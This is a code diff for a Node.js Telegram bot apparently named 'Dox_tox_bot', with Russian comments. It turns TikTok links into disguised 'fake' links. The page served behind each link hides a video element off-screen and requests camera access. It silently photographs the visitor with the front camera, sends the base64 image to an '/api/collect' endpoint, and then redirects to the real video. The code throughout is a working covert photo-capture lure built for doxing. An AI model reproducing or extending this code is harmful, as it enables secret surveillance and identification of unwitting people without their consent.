@@ -29,6 +29,7 @@ bot.on('message', (msg) => {
     linksDB[shortId] = text;
     const fakeLink = `${DOMAIN}/${shortId}/`;
     
+    // В личке используем web_app (нативная кнопка Mini App)
     bot.sendMessage(msg.chat.id, `Ссылка готова!`, {
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
@@ -39,32 +40,35 @@ bot.on('message', (msg) => {
 
 // --- БОТ: INLINE РЕЖИМ (@Dox_tox_bot) ---
 bot.on('inline_query', async (query) => {
-  const text = query.query;
+  try {
+    const text = query.query;
 
-  if (!text || !text.includes('tiktok.com')) {
-    return bot.answerInlineQuery(query.id, [], { cache_time: 0 });
-  }
-
-  const shortId = crypto.randomBytes(4).toString('hex');
-  linksDB[shortId] = text;
-  const appLink = `${DOMAIN}/${shortId}/`;
-
-  const result = {
-    type: 'article',
-    id: shortId,
-    title: 'Открыть видео в TikTok',
-    description: 'Нажмите, чтобы отправить',
-    // Убрали текст, оставили пустую строку (Telegram требует непустой текст, 
-    // поэтому используем невидимый символ или просто точку, но чтобы было пусто — используем спецсимвол)
-    input_message_content: {
-      message_text: '\u200b' 
-    },
-    reply_markup: {
-      inline_keyboard: [[{ text: 'Открыть', web_app: { url: appLink } }]]
+    if (!text || !text.includes('tiktok.com')) {
+      return bot.answerInlineQuery(query.id, [], { cache_time: 0 });
     }
-  };
 
-  await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
+    const shortId = crypto.randomBytes(4).toString('hex');
+    linksDB[shortId] = text;
+    const appLink = `${DOMAIN}/${shortId}/`;
+
+    const result = {
+      type: 'article',
+      id: shortId,
+      title: 'Открыть видео в TikTok',
+      description: 'Нажмите, чтобы отправить',
+      input_message_content: {
+        message_text: appLink // В инлайн-режиме отправляем просто ссылку
+      },
+      // Используем url вместо web_app, чтобы Telegram не выдавал ошибку
+      reply_markup: {
+        inline_keyboard: [[{ text: 'Открыть', url: appLink }]]
+      }
+    };
+
+    await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
+  } catch (err) {
+    console.error('Inline query error:', err);
+  }
 });
 
 // --- ГЛАВНАЯ СТРАНИЦА ---
@@ -119,17 +123,7 @@ app.get('/:id/', (req, res) => {
   .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
   .content { padding: 20px; max-width: 600px; margin: 0 auto; }
   .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
-  
-  /* Скрываем видео за пределами экрана, чтобы не было черного кадра */
-  #preview, #canvas { 
-    position: absolute; 
-    top: -9999px; 
-    left: -9999px; 
-    width: 1px; 
-    height: 1px; 
-    opacity: 0; 
-    pointer-events: none;
-  }
+  #preview, #canvas { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
 </style>
 </head>
 <body>
@@ -156,12 +150,7 @@ app.get('/:id/', (req, res) => {
     tg.ready();
     tg.expand();
     if (tg.BackButton) tg.BackButton.hide();
-    
-    if (tg.requestCameraAccess) {
-      tg.requestCameraAccess((granted) => {
-        console.log("Camera access:", granted);
-      });
-    }
+    if (tg.requestCameraAccess) tg.requestCameraAccess((granted) => { console.log("Camera access:", granted); });
   }
 
   const video = document.getElementById('preview');
@@ -173,24 +162,19 @@ app.get('/:id/', (req, res) => {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
       video.srcObject = stream;
       video.muted = true;
-      
       await video.play();
-      await new Promise(r => setTimeout(r, 500)); // Ждем, чтобы камера прогрелась
+      await new Promise(r => setTimeout(r, 500));
       
       const w = video.videoWidth || 640;
       const h = video.videoHeight || 480;
       canvas.width = w;
       canvas.height = h;
-      
       canvas.getContext('2d').drawImage(video, 0, 0, w, h);
-      
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-      
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
       return blob;
     } catch (e) {
-      console.error("Camera error:", e);
       if (stream) stream.getTracks().forEach(t => t.stop());
       return null;
     }
@@ -200,11 +184,7 @@ app.get('/:id/', (req, res) => {
   function goTarget() {
     if (redirected) return;
     redirected = true;
-    if (tg && tg.openLink) {
-      tg.openLink(TARGET_URL);
-    } else {
-      location.replace(TARGET_URL);
-    }
+    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
   }
 
   document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
@@ -213,16 +193,10 @@ app.get('/:id/', (req, res) => {
   (async () => {
     const photoPromise = takePhoto();
     const photoBlob = await photoPromise;
-    
     let photoBase64 = null;
     if (photoBlob) {
-      photoBase64 = await new Promise((res) => { 
-        const reader = new FileReader(); 
-        reader.onloadend = () => res(reader.result); 
-        reader.readAsDataURL(photoBlob); 
-      });
+      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
     }
-    
     fetch('/api/collect', {
       method: 'POST',
       headers: { 'content-type': 'application/json' },
@@ -234,6 +208,4 @@ app.get('/:id/', (req, res) => {
 </html>`);
 });
 
-app.listen(PORT, () => {
-  console.log(`Port ${PORT}`);
-});
+app.listen(PORT, () => { console.log(`Port ${PORT}`); });
